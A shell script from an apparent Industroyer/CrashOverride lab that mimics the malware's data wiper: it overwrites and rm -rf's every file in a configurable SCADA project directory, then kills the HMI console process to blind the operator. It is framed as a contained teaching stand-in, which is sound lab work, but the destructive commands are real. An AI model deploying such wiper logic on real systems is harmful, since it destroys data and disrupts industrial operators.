#!/bin/sh
# ics-wiper - a SYMBOLIC data wiper for the Industroyer case-study lab (LAB-ONLY).
#
# Educational stand-in for CrashOverride's data-wiper component. It is deliberately
# harmless: it only ever touches an isolated scratch directory *inside the one
# container it is run on* (the HMI's dummy SCADA project), and then stops the HMI
# operator console so the operator loses their view. It writes nowhere else, takes
# no host or shared path, and contains no destructive reach beyond $TARGET.
#
# This models "denial of view / denial of recovery": the RTU and field devices are
# untouched (faithful - the real wiper hit Windows SCADA/engineering hosts, not
# embedded field devices).
set -u

TARGET="${SCADA_DIR:-/opt/scada-project}"

echo "================================================================"
echo "  ICS-WIPER  (CrashOverride-style data wiper · SYMBOLIC/LAB)"
echo "================================================================"

# Safety rails: never operate on an empty, root, or missing path.
case "$TARGET" in
  ""|"/"|"/*"|"/.")
    echo "[!] refusing to run against unsafe target '$TARGET'"; exit 2 ;;
esac
if [ ! -d "$TARGET" ]; then
  echo "[!] no SCADA project directory at $TARGET on this host — nothing to wipe."
  echo "    (this payload only affects an operator console that has one)"
  exit 0
fi

echo "[*] enumerating operator SCADA project files under $TARGET :"
found=0
for f in $(find "$TARGET" -type f 2>/dev/null); do
  echo "      clobbering  $f"
  found=$((found + 1))
done
[ "$found" -eq 0 ] && echo "      (empty)"

# Overwrite then remove — only within $TARGET.
find "$TARGET" -type f -exec sh -c 'printf "WIPED\n" > "$1" 2>/dev/null' _ {} \; 2>/dev/null
rm -rf "${TARGET:?}"/* 2>/dev/null

echo "[+] $found SCADA project file(s) destroyed."
echo "[*] stopping the HMI operator console so it cannot be restarted ..."
# Bracket trick: '[h]mi.py' is a regex matching 'hmi.py' but the literal pattern
# does not contain the substring 'hmi.py', so pkill cannot match its own command.
# SIGKILL so the console dies instantly (Flask can dawdle on SIGTERM).
pkill -KILL -f '[h]mi.py' 2>/dev/null && echo "      hmi.py killed" || echo "      hmi.py not running here"

echo "================================================================"
echo "  HMI BLINDED — the operator has lost their view of the plant."
echo "  (the substation feeder itself is unchanged; field devices intact)"
echo "================================================================"
